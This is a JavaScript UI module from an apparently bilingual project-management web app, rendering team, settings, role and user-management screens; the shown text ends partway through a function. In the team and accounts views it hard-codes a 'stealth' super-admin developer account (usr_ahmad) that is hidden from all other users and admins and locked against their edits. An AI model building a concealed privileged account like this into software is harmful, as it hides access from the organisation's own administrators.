import { state } from '../../core/state.js';
import { api } from '../../core/api.js';
import { getActiveCalendarSystem } from '../../core/utils.js';

export function renderTeam() {
  const currentUserId = state.data?.user?.id;
  let users = (state.data?.users || []).filter((user) => user.status !== 'inactive');
  
  // Stealth Super Admin & Developer: Ahmad is completely invisible to any other user
  if (currentUserId !== 'usr_ahmad') {
    users = users.filter(u => u.id !== 'usr_ahmad');
  } else {
    // When logged in as Ahmad: sort Ahmad to the very top
    users = [...users].sort((a, b) => (a.id === 'usr_ahmad' ? -1 : b.id === 'usr_ahmad' ? 1 : 0));
  }

  return `
    <div class="page-head">
      <div>
        <p class="eyebrow">${choose('الأشخاص والمسؤوليات', 'PEOPLE & OWNERSHIP')}</p>
        <h1>${t('team')}</h1>
        <p>${choose('كل عضو يعرف دوره، مسؤولياته، وما يحتاج إغلاقه بعد ذلك.', 'Every member has a clear role, responsibility, and next action.')}</p>
      </div>
      <div class="page-actions">
        ${isAdmin() ? `<button class="btn btn-primary" data-action="new-user">${icon('plus', 15)} ${t('addMember')}</button>` : ''}
      </div>
    </div>
    <div class="team-grid">
      ${users.map((user) => {
        const metrics = teamMetrics(user.id, state.data?.tasks || []);
        const isAhmadUser = user.id === 'usr_ahmad';
        return `
          <article class="member-card ${isAhmadUser ? 'system-developer-card' : ''}" style="${isAhmadUser ? 'border:2px solid var(--brand-teal);box-shadow:0 6px 20px rgba(13,148,136,0.12);' : ''}">
            <div class="member-card-head">
              <div class="member-card-person">
                ${avatar(user, 'avatar-lg')}
                <div class="member-card-person-copy">
                  <strong>${esc(choose(user.name, user.nameEn || user.name))}</strong>
                  <span>${esc(choose(user.jobTitleAr || (isAhmadUser ? 'المبرمج / مدير النظام' : ''), user.jobTitleEn || user.jobTitleAr || ''))}</span>
                </div>
              </div>
              ${isAhmadUser 
                ? `<span class="badge" style="background:#fef3c7;color:#92400e;font-size:10.5px;font-weight:bold;padding:4px 8px;border-radius:6px;border:1px solid #fde68a;">👑 ${choose('مدير ومطور النظام', 'Super Admin & Dev')}</span>`
                : (canManageAccountPermissions() && user.id !== state.data?.user?.id ? `<button class="member-menu" data-action="open-user" data-user-id="${esc(user.id)}">${icon('more', 15)}</button>` : '')
              }
            </div>
            <div class="member-card-role">
              <span class="status-badge ${user.status === 'active' ? 'done' : 'not_started'}">${esc(roleName(user))}</span>
            </div>
            <div class="member-card-stats">
              <span>${t('progress')} <strong>${metrics.progress}%</strong></span>
              <span>${metrics.tasks} ${t('tasks')}</span>
            </div>
            <div class="member-email">${user.email ? esc(user.email) : t('noEmail')}</div>
          </article>
        `;
      }).join('')}
    </div>
  `;
}

export function renderAuditForProject(projectId) {
  const logs = (state.data?.auditLogs || []).filter((log) => log.details?.projectId === projectId || (log.entityType === 'project' && log.entityId === projectId));
  if (!logs.length) return `<div class="empty">${icon('check', 18)}<span>${choose('لا توجد تغييرات مسجلة بعد.', 'No changes recorded yet.')}</span></div>`;
  return `<div class="audit-list">${logs.map((log) => `<div class="audit-row"><span class="audit-dot"></span><div class="audit-copy"><strong>${esc(log.user ? choose(log.user.name, log.user.nameEn || log.user.name) : 'DARC')} · ${esc(log.action)}</strong><span>${esc(log.entityType)} · ${dateLabel(log.createdAt, true)}</span></div></div>`).join('')}</div>`;
}

export function renderSettings() {
  const currentUserId = state.data?.user?.id;
  const userIsAdmin = isAdmin();

  // Settings tabs: All users can access Profile and Security
  // Admins also get Company, Roles, Accounts, Trash, Audit
  const sections = userIsAdmin
    ? [
        ['profile', choose('الملف الشخصي', 'Profile')],
        ['company', t('company')],
        ['roles', t('roles')],
        ['accounts', t('accounts')],
        ['security', choose('الأمان', 'Security')],
        ['trash', choose('سلة المهملات', 'Trash')],
        ['audit', t('audit')]
      ]
    : [
        ['profile', choose('الملف الشخصي', 'Profile')],
        ['security', choose('الأمان', 'Security')]
      ];

  if (!sections.some(([k]) => k === state.settingsSection)) {
    state.settingsSection = 'profile';
  }

  const currentUser = state.data?.user || {};
  let content = '';

  // PROFILE SECTION (All users)
  if (state.settingsSection === 'profile') {
    content = `
      <section class="setting-section">
        <div class="panel-head">
          <div>
            <h2>${choose('الملف الشخصي', 'Profile')}</h2>
            <p>${choose('إدارة صورتك الشخصية وبيانات حسابك في النظام.', 'Manage your profile picture and account information.')}</p>
          </div>
        </div>

        <div style="display:flex;align-items:center;gap:20px;padding:18px;background:var(--surface-soft);border:1px solid var(--line);border-radius:12px;margin-bottom:24px;">
          <div id="profile-avatar-preview" style="position:relative;width:72px;height:72px;border-radius:999px;overflow:hidden;box-shadow:var(--shadow-sm);flex-shrink:0;">
            ${avatar(currentUser, 'avatar-xl')}
          </div>
          <div>
            <h3 style="margin:0 0 6px 0;font-size:16px;">${esc(choose(currentUser.name, currentUser.nameEn || currentUser.name))}</h3>
            <p style="margin:0 0 10px 0;font-size:13px;color:var(--muted);">${esc(choose(currentUser.jobTitleAr || '', currentUser.jobTitleEn || currentUser.jobTitleAr || ''))} · <span class="status-badge done">${esc(roleName(currentUser))}</span></p>
            <input type="file" id="user-avatar-file-input" accept="image/*" style="display:none;" />
            <button type="button" class="btn btn-soft btn-sm" onclick="document.getElementById('user-avatar-file-input').click()">
              ${icon('upload', 14)} ${choose('رفع صورة جديدة', 'Upload new avatar')}
            </button>
            <span style="font-size:11px;color:var(--muted);margin-inline-start:10px;">${choose('يدعم JPG, PNG, WebP', 'Supports JPG, PNG, WebP')}</span>
          </div>
        </div>

        <form data-action="update-profile">
          <div class="form-grid">
            <div class="field">
              <label>${t('nameAr')}</label>
              <input name="name" value="${esc(currentUser.name || '')}" required />
            </div>
            <div class="field">
              <label>${t('nameEn')}</label>
              <input name="nameEn" value="${esc(currentUser.nameEn || '')}" />
            </div>
            <div class="field">
              <label>${t('jobTitle')} (${choose('عربي', 'AR')})</label>
              <input name="jobTitleAr" value="${esc(currentUser.jobTitleAr || '')}" />
            </div>
            <div class="field">
              <label>${t('jobTitle')} (${choose('إنجليزي', 'EN')})</label>
              <input name="jobTitleEn" value="${esc(currentUser.jobTitleEn || '')}" />
            </div>
            <div class="field full">
              <label>${t('email')}</label>
              <input value="${esc(currentUser.email || '')}" disabled style="background:var(--surface-soft);cursor:not-allowed;" />
            </div>
            <div class="field full">
              <label>${choose('نظام التقويم المفضل في المنصة', 'Preferred Calendar System')}</label>
              <select name="calendarSystem" class="input">
                <option value="gregorian" ${getActiveCalendarSystem() === 'gregorian' ? 'selected' : ''}>${choose('ميلادي — اليوم / الشهر / السنة (مثال: 07/09/2026)', 'Gregorian — Day / Month / Year (e.g. 07/09/2026)')}</option>
                <option value="hijri" ${getActiveCalendarSystem() === 'hijri' ? 'selected' : ''}>${choose('هجري أم القرى — اليوم / الشهر / السنة (مثال: 25/02/1448 هـ)', 'Hijri Umm al-Qura — Day / Month / Year (e.g. 25/02/1448 AH)')}</option>
              </select>
            </div>
          </div>
          <div class="form-actions" style="margin-top:20px;">
            <button type="submit" class="btn btn-primary">${t('save')}</button>
          </div>
        </form>
      </section>
    `;
  }

  // COMPANY SECTION (Admin only)
  if (state.settingsSection === 'company' && userIsAdmin) {
    const comp = state.data?.company || {};
    content = `
      <section class="setting-section">
        <h2>${t('company')}</h2>
        <p>${choose('هوية مساحة العمل وشعار الشركة واللغة الافتراضية.', 'Workspace identity, company logo, and default language.')}</p>
        
        <div class="company-preview" style="display:flex;align-items:center;gap:16px;padding:16px;background:var(--surface-soft);border:1px solid var(--line);border-radius:12px;margin-bottom:20px;">
          <div id="company-logo-preview" style="width:64px;height:64px;border-radius:12px;background:var(--surface);border:1px solid var(--line);display:flex;align-items:center;justify-content:center;overflow:hidden;box-shadow:var(--shadow-sm);flex-shrink:0;">
            ${comp.logoUrl 
              ? `<img src="${esc(comp.logoUrl)}" alt="Logo" style="width:100%;height:100%;object-fit:contain;" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" /><span class="brand-mark" style="display:none;">${icon('building', 24)}</span>`
              : `<span class="brand-mark">${icon('building', 24)}</span>`
            }
          </div>
          <div>
            <strong style="display:block;font-size:16px;margin-bottom:4px;">${esc(comp.name || 'DARC Design Team')}</strong>
            <span style="display:block;font-size:12px;color:var(--muted);margin-bottom:8px;">${choose('العربية افتراضيًا · دعم الإنجليزية · توقيت الرياض', 'Arabic default · English support · Riyadh timezone')}</span>
            <input type="file" id="company-logo-file-input" accept="image/*" style="display:none;" />
            <button type="button" class="btn btn-soft btn-sm" onclick="document.getElementById('company-logo-file-input').click()">
              ${icon('upload', 14)} ${choose('رفع وتعديل الشعار', 'Upload & Change Logo')}
            </button>
            <span style="font-size:11px;color:var(--muted);margin-inline-start:10px;">${choose('يدعم PNG, SVG, JPG', 'Supports PNG, SVG, JPG')}</span>
          </div>
        </div>

        <form data-action="update-company">
          <div class="form-grid">
            <div class="field">
              <label>${t('nameAr')}</label>
              <input name="nameAr" value="${esc(comp.nameAr || '')}" required />
            </div>
            <div class="field">
              <label>${t('nameEn')}</label>
              <input name="nameEn" value="${esc(comp.nameEn || '')}" />
            </div>
            <div class="field full">
              <label>${t('emailStatus')}</label>
              <input value="${esc(state.data?.emailConfigured ? t('emailConfigured') : t('emailNotConfigured'))}" disabled />
            </div>
          </div>
          <div class="form-actions" style="margin-top:15px;">
            <button type="submit" class="btn btn-primary">${t('save')}</button>
          </div>
        </form>
        <div class="login-demo" style="margin-top:12px;">${icon('info', 16)}<span>${t('emailInfo')}</span></div>
      </section>
      <section class="setting-section">
        <h2>${choose('نموذج الإنجاز', 'Progress model')}</h2>
        <p>${t('weightedExplanation')}</p>
        <div class="report-stat-list">
          <div class="report-stat"><span>${t('weightedProgress')}</span><strong style="color:var(--teal)">100%</strong></div>
          <div class="report-stat"><span>${t('simpleProgress')}</span><strong style="color:var(--ink-soft)">—</strong></div>
        </div>
      </section>
    `;
  }

  // SECURITY SECTION (All users)
  if (state.settingsSection === 'security') {
    content = `
      <section class="setting-section">
        <h2>${choose('الأمان', 'Security')}</h2>
        <p>${choose('تغيير كلمة المرور أو تسجيل الخروج من كافة الأجهزة.', 'Change your password or sign out from all devices.')}</p>
        <form data-action="change-password">
          <div class="form-grid" style="margin-top:18px">
            <div class="field"><label>${choose('كلمة المرور الحالية', 'Current password')}</label><input type="password" name="oldPassword" required /></div>
            <div class="field"><label>${choose('كلمة المرور الجديدة', 'New password')}</label><input type="password" name="newPassword" minlength="10" required /></div>
          </div>
          <div class="form-actions" style="margin-top:15px"><button type="submit" class="btn btn-primary">${t('save')}</button></div>
        </form>
        <hr style="margin:30px 0;border:0;border-top:1px solid var(--border)">
        <div style="display:flex;align-items:center;justify-content:space-between">
          <div>
            <h3 style="font-size:14px;margin-bottom:4px">${choose('تسجيل الخروج من كل الأجهزة', 'Sign out of all devices')}</h3>
            <p style="color:var(--muted);font-size:13px">${choose('إنهاء كافة الجلسات النشطة على كل المتصفحات.', 'End all active sessions on all browsers.')}</p>
          </div>
          <button class="btn btn-danger btn-sm" data-action="logout-all">${choose('تسجيل خروج للكل', 'Sign out all')}</button>
        </div>
      </section>
    `;
  }

  // ACCOUNTS SECTION (Admin only)
  if (state.settingsSection === 'accounts' && userIsAdmin) {
    let accountsList = (state.data?.users || []);
    // Stealth Super Admin: Ahmad is completely invisible to any other user
    if (currentUserId !== 'usr_ahmad') {
      accountsList = accountsList.filter(u => u.id !== 'usr_ahmad');
    }

    content = `
      <section class="setting-section">
        <div class="panel-head">
          <div>
            <h2>${t('accounts')}</h2>
            <p>${choose('الحسابات الحالية وصلاحية كل عضو. يمكنك إضافة أو تعديل أو تعطيل الحسابات من هنا.', 'Current accounts and each member’s access. Add, edit, or deactivate them here.')}</p>
          </div>
          <button class="btn btn-primary btn-sm" data-action="new-user">${icon('plus', 14)} ${t('addMember')}</button>
        </div>
        <div class="table-wrap">
          <table class="data-table">
            <thead>
              <tr>
                <th>${t('team')}</th>
                <th>${t('role')}</th>
                <th>${t('email')}</th>
                <th>${t('accountStatus')}</th>
                <th></th>
              </tr>
            </thead>
            <tbody>
              ${accountsList.map((user) => {
                const isAhmad = user.id === 'usr_ahmad';
                return `
                  <tr>
                    <td>
                      <div class="team-member">
                        ${avatar(user)}
                        <div class="team-member-copy">
                          <strong>${esc(choose(user.name, user.nameEn || user.name))}</strong>
                          <span>${esc(choose(user.jobTitleAr || (isAhmad ? 'المبرمج / مدير النظام' : ''), user.jobTitleEn || user.jobTitleAr || ''))}</span>
                        </div>
                      </div>
                    </td>
                    <td>
                      ${isAhmad ? `<span class="badge" style="background:#fef3c7;color:#92400e;font-size:11px;font-weight:bold;padding:2px 7px;border-radius:6px;">👑 مدير ومطور النظام</span>` : esc(roleName(user))}
                    </td>
                    <td>${user.email ? esc(user.email) : `<span style="color:var(--muted)">${t('noEmail')}</span>`}</td>
                    <td>
                      <span class="status-badge ${user.status === 'active' ? 'done' : 'not_started'}">${user.status === 'active' ? t('activeAccount') : t('pendingAccount')}</span>
                    </td>
                    <td>
                      <div class="role-actions">
                        ${isAhmad ? `
                          <button class="btn btn-soft btn-sm" data-action="open-user" data-user-id="${esc(user.id)}">${t('edit')}</button>
                        ` : `
                          <button class="btn btn-soft btn-sm" data-action="open-user" data-user-id="${esc(user.id)}">${t('edit')}</button>
                          ${user.id !== state.data?.user?.id ? `
                            <button class="btn btn-soft btn-sm" data-action="force-password-user" data-user-id="${esc(user.id)}" title="${user.status === 'pending' ? choose('تفعيل الحساب يدوياً', 'Activate manually') : choose('تغيير كلمة المرور', 'Change password')}">${icon(user.status === 'pending' ? 'check' : 'settings', 13)}</button>
                            <button class="btn btn-soft btn-sm" data-action="impersonate-user" data-user-id="${esc(user.id)}" title="دخول كـ هذا الحساب">${icon('user', 13)}</button>
                          ` : ''}
                          ${user.id !== state.data?.user?.id && user.email ? `<button class="btn btn-ghost btn-sm" data-action="invite-user" data-user-id="${esc(user.id)}">${icon('send', 13)}</button>` : ''}
                          ${user.id !== state.data?.user?.id ? `<button class="btn btn-danger btn-sm" data-action="deactivate-user" data-user-id="${esc(user.id)}">${icon('trash', 13)}</button>` : ''}
                        `}
                      </div>
                    </td>
                  </tr>
                `;
              }).join('')}
            </tbody>
          </table>
        </div>
      </section>
    `;
  }

  // ROLES SECTION (Admin only)
  if (state.settingsSection === 'roles' && userIsAdmin) {
    content = `<section class="setting-section"><div class="panel-head"><div><h2>${t('roles')}</h2><p>${t('manageOnlyAdmin')}</p></div><button class="btn btn-primary btn-sm" data-action="new-role">${icon('plus', 14)} ${t('addRole')}</button></div><div class="role-list">${(state.data?.roles || []).map((role) => `<div class="role-row"><div class="role-copy"><strong>${esc(choose(role.nameAr, role.nameEn))} ${role.builtIn ? `<span class="mini-badge" style="padding:4px 6px;margin-right:5px;color:var(--blue);background:var(--blue-soft)">${t('builtIn')}</span>` : ''}</strong><span>${esc(choose(role.descriptionAr, role.descriptionEn))}</span><small>${role.permissions.includes('*') ? choose('صلاحية كاملة', 'Full access') : `${role.permissions.length} ${t('permissionCount')}`}</small></div><div class="role-actions"><button class="btn btn-soft btn-sm" data-action="open-role" data-role-id="${esc(role.id)}">${icon('edit', 13)} ${t('edit')}</button>${!role.builtIn ? `<button class="btn btn-danger btn-sm" data-action="delete-role" data-role-id="${esc(role.id)}">${icon('trash', 13)}</button>` : ''}</div></div>`).join('')}</div></section>`;
  }

  // TRASH SECTION (Admin only)
  if (state.settingsSection === 'trash' && userIsAdmin) {
    const listHtml = state.trash && state.trash.length ? `<div class="table-wrap"><table class="data-table"><thead><tr><th>${choose('الاسم', 'Name')}</th><th>${choose('النوع', 'Type')}</th><th>${choose('تاريخ الحذف', 'Deleted At')}</th><th></th></tr></thead><tbody>${state.trash.map((item) => `<tr><td><strong>${esc(item.name)}</strong></td><td>${esc(item.type)}</td><td>${dateLabel(item.deletedAt, true)}</td><td style="text-align:${state.lang==='ar'?'left':'right'}"><button class="btn btn-ghost btn-sm" data-action="restore-item" data-type="${item.type}" data-id="${item.id}">${icon('arrow', 13)} ${choose('استعادة', 'Restore')}</button></td></tr>`).join('')}</tbody></table></div>` : `<div class="empty">${choose('السلة فارغة.', 'Trash is empty.')}</div>`;
    content = `<section class="setting-section"><div class="panel-head"><div><h2>${choose('سلة المهملات', 'Trash')}</h2><p>${choose('استعادة البيانات المحذوفة.', 'Restore deleted data.')}</p></div></div>${listHtml}</section>`;
  }

  // AUDIT SECTION (Admin only)
  if (state.settingsSection === 'audit' && userIsAdmin) {
    content = `<section class="setting-section"><div class="panel-head"><div><h2>${t('audit')}</h2><p>${choose('سجل غير قابل للتجاهل للعمليات الإدارية وتغييرات العمل.', 'A reviewable history of administrative and work changes.')}</p></div></div>${state.data?.auditLogs?.length ? `<div class="audit-list">${state.data.auditLogs.map((log) => `<div class="audit-row"><span class="audit-dot"></span><div class="audit-copy"><strong>${esc(log.user ? choose(log.user.name, log.user.nameEn || log.user.name) : 'DARC')} · ${esc(log.action)}</strong><span>${esc(log.entityType)} · ${dateLabel(log.createdAt, true)}</span></div></div>`).join('')}</div>` : `<div class="empty">${choose('سيظهر سجل العمليات بعد أول تعديل.', 'The audit trail will appear after the first change.')}</div>`}</section>`;
  }

  return `
    <div class="page-head">
      <div>
        <p class="eyebrow">${userIsAdmin ? choose('تحكم مركزي', 'CENTRAL CONTROL') : choose('الملف الشخصي', 'USER PROFILE')}</p>
        <h1>${userIsAdmin ? t('settings') : choose('الملف الشخصي والأمان', 'Profile & Security')}</h1>
        <p>${userIsAdmin ? choose('إدارة إعدادات الشركة والحسابات والأدوار والنظام.', 'Manage workspace, accounts, roles, and settings.') : choose('إدارة معلومات حسابك وكلمة المرور وصورتك الشخصية.', 'Manage your account info, password, and personal avatar.')}</p>
      </div>
      <div class="page-actions">
        <span class="status-badge done">${icon(userIsAdmin ? 'shield' : 'user', 13)} ${esc(roleName(currentUser))}</span>
      </div>
    </div>
    <div class="settings-layout">
      <aside class="settings-nav">
        ${sections.map(([key, label]) => `<button class="${state.settingsSection === key ? 'active' : ''}" data-action="settings-section" data-section="${key}">${label}</button>`).join('')}
      </aside>
      <div class="settings-content">${content}</div>
    </div>
  `;
}

export const FULL_PERMISSIONS_CATALOG = [
  // 🏢 المشاريع والفرق (Projects & Teams)
  { id: 'view_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'عرض المشاريع', nameEn: 'View Projects' },
  { id: 'create_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'إنشاء مشاريع جديدة', nameEn: 'Create Projects' },
  { id: 'edit_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'تعديل بيانات ومراحل المشاريع', nameEn: 'Edit Projects' },
  { id: 'delete_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'حذف المشاريع', nameEn: 'Delete Projects' },
  { id: 'manage_project_members', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'إدارة وتعيين أعضاء المشروع', nameEn: 'Manage Project Members' },

  // 📋 المهام والتنفيذ (Tasks & Execution)
  { id: 'create_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'إنشاء المهام والمخرجات', nameEn: 'Create Tasks' },
  { id: 'edit_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'تعديل تفاصيل وحالة المهام', nameEn: 'Edit Tasks' },
  { id: 'delete_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'حذف المهام', nameEn: 'Delete Tasks' },
  { id: 'assign_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'إسناد وتوزيع المهام للمنفذين', nameEn: 'Assign Tasks' },
  { id: 'review_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'مراجعة المخرجات الهندسية', nameEn: 'Review Deliverables' },
  { id: 'approve_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'اعتماد وتوقيع المخرجات الهندسية', nameEn: 'Approve Deliverables' },
  { id: 'manage_reminders', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'إدارة التذكيرات والمتابعات', nameEn: 'Manage Reminders' },

  // 📐 المخططات والمكتبة القياسية (Drawings & Deliverables Library)
  { id: 'upload_documents', category: 'documents', categoryAr: 'المخططات والمكتبة القياسية', categoryEn: 'Drawings & Deliverables Library', nameAr: 'رفع وإدارة المخططات والمستندات', nameEn: 'Upload Documents' },
  { id: 'delete_documents', category: 'documents', categoryAr: 'المخططات والمكتبة القياسية', categoryEn: 'Drawings & Deliverables Library', nameAr: 'حذف المخططات والمستندات', nameEn: 'Delete Documents' },
  { id: 'manage_templates', category: 'documents', categoryAr: 'المخططات والمكتبة القياسية', categoryEn: 'Drawings & Deliverables Library', nameAr: 'إدارة مكتبة القوالب والمخرجات القياسية', nameEn: 'Manage Templates Library' },

  // 📊 المؤشرات والتقارير (Analytics & Reports)
  { id: 'view_dashboard', category: 'reports', categoryAr: 'المؤشرات والتقارير', categoryEn: 'Analytics & Reports', nameAr: 'عرض لوحة التحكم والمؤشرات', nameEn: 'View Dashboard' },
  { id: 'view_reports', category: 'reports', categoryAr: 'المؤشرات والتقارير', categoryEn: 'Analytics & Reports', nameAr: 'استعراض وتصدير التقارير الهندسية والمالية', nameEn: 'View Reports' },

  // 🛡️ النظام والأمان (Administration & Governance)
  { id: 'manage_users', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إدارة ودعوة وتفعيل حسابات المستخدمين', nameEn: 'Manage Users' },
  { id: 'manage_existing_account_permissions', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'تعديل أدوار وصلاحيات الحسابات الموجودة', nameEn: 'Manage Existing Account Permissions' },
  { id: 'manage_roles', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إنشاء وتعديل الأدوار والصلاحيات', nameEn: 'Manage Roles & Permissions' },
  { id: 'manage_settings', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إدارة إعدادات النظام والشركة ومساحة العمل', nameEn: 'Manage Company & Settings' },
  { id: 'manage_trash', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إدارة واستعادة سلة المهملات', nameEn: 'Manage Trash' },
  { id: 'view_audit_logs', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'استعراض سجل الرقابة والعمليات الأمنية', nameEn: 'View Audit Logs' }
];

export function openRoleModal(role = null) {
  const catalog = (state.data?.permissionsCatalog && state.data.permissionsCatalog.length >= 10)
    ? state.data.permissionsCatalog
    : FULL_PERMISSIONS_CATALOG;

  // Group by category
  const categoriesMap = new Map();
  catalog.forEach(p => {
    const catKey = p.category || 'general';
    const catName = choose(p.categoryAr || catKey, p.categoryEn || catKey);
    if (!categoriesMap.has(catKey)) {
      categoriesMap.set(catKey, { name: catName, items: [] });
    }
    categoriesMap.get(catKey).items.push(p);
  });

  const isRoleAdmin = role?.id === 'admin' || (role?.permissions && role.permissions.includes('*'));

  const categoriesHtml = Array.from(categoriesMap.entries()).map(([catKey, group]) => {
    const options = group.items.map((permission) => {
      const key = permission.id || permission.key;
      const label = choose(permission.nameAr || permission.ar, permission.nameEn || permission.en || key);
      const isChecked = isRoleAdmin || (role?.permissions && (role.permissions.includes(key) || (typeof PERMISSION_ALIASES !== 'undefined' && PERMISSION_ALIASES[key] && role.permissions.includes(PERMISSION_ALIASES[key]))));
      const isDisabled = isRoleAdmin ? 'disabled' : '';
      return `
        <label class="permission-option" style="cursor:${isRoleAdmin ? 'default' : 'pointer'};">
          <input type="checkbox" name="permissions" value="${esc(key)}" ${isChecked ? 'checked' : ''} ${isDisabled} />
          <span style="font-weight:500;">${esc(label)}</span>
        </label>
      `;
    }).join('');

    return `
      <div class="permission-category-group" style="margin-bottom:12px;">
        <div style="font-size:11.5px;font-weight:700;color:var(--teal);margin-bottom:6px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--line);padding-bottom:3px;">
          <span>${esc(group.name)}</span>
          <span style="font-size:10px;font-weight:normal;color:var(--muted);">(${group.items.length})</span>
        </div>
        <div class="permission-grid" style="grid-template-columns:repeat(auto-fit, minmax(210px, 1fr));gap:6px;max-height:none;">
          ${options}
        </div>
      </div>
    `;
  }).join('');

  const selectAllControls = !isRoleAdmin ? `
    <div style="display:flex;justify-content:space-between;align-items:center;margin:15px 0 8px;">
      <p class="field-hint" style="margin:0;font-weight:600;color:var(--ink);">${t('permissions')} <span style="font-weight:normal;color:var(--muted);font-size:11px;">(${catalog.length} ${choose('صلاحية متاحة', 'available permissions')})</span></p>
      <div style="display:inline-flex;gap:6px;">
        <button type="button" class="btn btn-ghost btn-sm" id="btn-perm-select-all" style="font-size:11px;padding:2px 8px;">${choose('تحديد الكل', 'Select All')}</button>
        <button type="button" class="btn btn-ghost btn-sm" id="btn-perm-deselect-all" style="font-size:11px;padding:2px 8px;">${choose('إلغاء التحديد', 'Deselect All')}</button>
      </div>
    </div>
  ` : '';

  const form = `
    <form id="role-form" data-role-id="${esc(role?.id || '')}">
      <div class="form-grid">
        <div class="field">
          <label>${t('nameAr')} *</label>
          <input name="nameAr" value="${esc(role?.nameAr || '')}" required />
        </div>
        <div class="field">
          <label>${t('nameEn')}</label>
          <input name="nameEn" value="${esc(role?.nameEn || '')}" />
        </div>
        <div class="field full">
          <label>${t('roleDescription')}</label>
          <textarea name="descriptionAr" rows="2">${esc(role?.descriptionAr || '')}</textarea>
        </div>
      </div>
      ${isRoleAdmin ? `
        <div class="role-modal-note" style="margin-top:15px;">
          ${choose('مدير النظام يملك صلاحيات الإدارة الشاملة [*] الكاملة على كافة جوانب النظام والشركة ولا يمكن تقليصها.', 'The system administrator always keeps full root privileges [*] across all aspects of the system.')}
        </div>
      ` : `
        ${selectAllControls}
        <div style="max-height:360px;overflow-y:auto;padding-inline-end:4px;border:1px solid var(--line);border-radius:10px;padding:12px;background:var(--surface-soft);">
          ${categoriesHtml}
        </div>
      `}
      <div class="modal-actions" style="margin-top:18px;">
        <button type="button" class="btn btn-ghost" data-action="close-modal">${t('cancel')}</button>
        <button type="submit" class="btn btn-primary">${icon('check', 14)} ${role ? t('save') : t('create')}</button>
      </div>
    </form>
  `;

  document.getElementById('modal-root').innerHTML = modalShell(
    role ? choose('تعديل الدور والصلاحيات', 'Edit role & permissions') : t('addRole'),
    choose('تحديد الصلاحيات الدقيقة لهذا الدور ومجالات الوصول في النظام.', 'Define granular permissions and workspace access levels for this role.'),
    form,
    'role',
    'modal-lg'
  );

  // Wire up Select All / Deselect All
  const modalRoot = document.getElementById('modal-root');
  if (modalRoot) {
    const btnSelectAll = modalRoot.querySelector('#btn-perm-select-all');
    const btnDeselectAll = modalRoot.querySelector('#btn-perm-deselect-all');
    if (btnSelectAll) {
      btnSelectAll.addEventListener('click', () => {
        modalRoot.querySelectorAll('input[name="permissions"]:not(:disabled)').forEach(cb => cb.checked = true);
      });
    }
    if (btnDeselectAll) {
      btnDeselectAll.addEventListener('click', () => {
        modalRoot.querySelectorAll('input[name="permissions"]:not(:disabled)').forEach(cb => cb.checked = false);
      });
    }
  }
}

export function openUserModal(user = null) {
  if (user?.id === 'usr_ahmad' && state.data?.user?.id !== 'usr_ahmad') {
    return showToast(choose('لا يمكن تعديل حساب مدير ومطور النظام.', 'System Developer account is protected.'), true);
  }
  if (!user && !isAdmin()) return showToast(t('adminOnly'), true);
  const permissionOnly = !isAdmin();
  const locked = permissionOnly ? 'disabled' : '';
  const availableRoles = (state.data?.roles || []).filter((role) => isAdmin() || role.id !== 'admin');
  const form = `<form id="user-form" data-user-id="${esc(user?.id || '')}" data-permission-only="${permissionOnly}"><div class="form-grid"><div class="field full"><label>${t('nameAr')}</label><input name="name" value="${esc(user?.name || '')}" ${locked} required /></div><div class="field"><label>${t('nameEn')}</label><input name="nameEn" value="${esc(user?.nameEn || '')}" ${locked} /></div><div class="field"><label>${t('jobTitle')}</label><input name="jobTitleAr" value="${esc(user?.jobTitleAr || '')}" ${locked} /></div><div class="field"><label>${t('email')}</label><input name="email" type="email" value="${esc(user?.email || '')}" placeholder="name@darc.com" ${locked} /></div><div class="field"><label>${t('role')}</label><select name="roleId">${availableRoles.map((role) => `<option value="${esc(role.id)}" ${user?.roleId === role.id ? 'selected' : ''}>${esc(choose(role.nameAr, role.nameEn))}</option>`).join('')}</select></div></div><div class="field-hint">${permissionOnly ? choose('يمكنك هنا تغيير دور الحساب الموجود فقط. إدارة الاسم والبريد والحذف وإضافة الحسابات محصورة بأحمد مدير النظام.', 'Here you can change the role of an existing account only. Names, email, deletion, and account creation remain restricted to Ahmed, the system administrator.') : choose('إذا تركت البريد فارغًا يبقى الحساب مسجلًا داخل الفريق بانتظار دعوة. عند إضافة بريد يمكنك إرسال دعوة من قائمة الحسابات.', 'If email is left blank, the member remains in the team directory awaiting an invite. Add an email to send an invitation from Accounts.')}</div><div class="modal-actions"><button type="button" class="btn btn-ghost" data-action="close-modal">${t('cancel')}</button><button type="submit" class="btn btn-primary">${icon('check', 14)} ${user ? (permissionOnly ? choose('حفظ الصلاحية', 'Save permission') : t('save')) : t('create')}</button></div></form>`;
